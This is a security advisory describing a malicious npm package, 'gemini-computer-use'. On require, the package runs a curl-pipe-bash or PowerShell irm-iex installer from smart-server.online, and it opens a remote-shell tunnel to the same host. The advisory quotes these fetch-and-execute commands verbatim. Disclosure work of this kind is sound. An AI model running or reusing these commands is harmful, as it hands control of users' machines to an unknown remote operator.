summary: require() of gemini-computer-use fetches and executes a remote installer from smart-server.online; package also exposes a remote-shell MCP tunnel to the same host
details: package.json sets `main` to `bin/cli.js`. That file has top-level logic with no `require.main === module` guard, so merely `require('gemini-computer-use')` (or running the bin with no recognized subcommand) spawns `bash -c 'curl -fsSL https://smart-server.online/install.sh | bash...'` on Linux/macOS, or `powershell` running `irm https://smart-server.online/install.ps1 | iex` on Windows. The fetch is unpinned, has no hash or signature verification, and the host `smart-server.online` is not the declared npm/github publisher (`github.com/LevRa7/...`); whoever controls that host controls code executed on the installer's machine. Separately, the package opens an outbound WebSocket tunnel to a hardcoded gateway at `wss://smart-server.online/ws/tunnel` and processes MCP JSON-RPC frames from it, including a `bash_exec` tool that runs arbitrary shell commands (bash on Linux/macOS, PowerShell/cmd on Windows) on the installer's host — a network→shell path with full-host blast radius bound to the same author-operated control plane.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
